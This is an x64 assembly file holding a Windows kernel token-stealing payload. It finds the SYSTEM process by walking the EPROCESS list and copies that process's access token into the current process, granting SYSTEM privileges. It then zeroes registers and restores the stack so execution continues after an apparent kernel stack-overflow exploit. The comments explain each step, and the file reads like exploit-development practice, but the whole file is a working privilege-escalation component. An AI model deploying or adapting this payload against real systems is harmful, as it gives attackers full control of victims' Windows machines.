.code
PUBLIC GetToken
GetToken   proc

; Start of Token Stealing Stub
xor rax, rax                    ; Set ZERO
mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread
                                ; _KTHREAD is located at GS : [0x188]

mov rax, [rax + 0B8h]            ; Get nt!_KTHREAD.ApcState.Process
mov rcx, rax                    ; Copy current process _EPROCESS structure
mov r11, rcx                    ; Store Token.RefCnt
and r11, 7

mov rdx, 4h                     ; SYSTEM process PID = 0x4

SearchSystemPID:
mov rax, [rax + 2e8h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub rax, 2e8h
cmp[rax + 2e0h], rdx            ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID

mov rdx, [rax + 358h]           ; Get SYSTEM process nt!_EPROCESS.Token
and rdx, 0fffffffffffffff0h
or rdx, r11
mov[rcx + 358h], rdx            ; Replace target process nt!_EPROCESS.Token
                                ; with SYSTEM process nt!_EPROCESS.Token
                                ; End of Token Stealing Stub

; We still need to reconstruct a valid response
xor rax, rax                    ; Set NTSTATUS SUCCEESS

; These registers need to be zeroed out, although I don't know the exact reason, a good general stragegy would be
; to keep a note on all register values when you make a safe call and then see which registers get mangled values
; A good start would be zeroeing out the registers that are zero when you submit safe input, in our case, that was
; registers rsi and rdi
xor rsi, rsi
xor rdi, rdi

; Recreate the instructions that would've been executed if we didn't ruin the stack frame
add rsp, 040h
ret

GetToken ENDP
end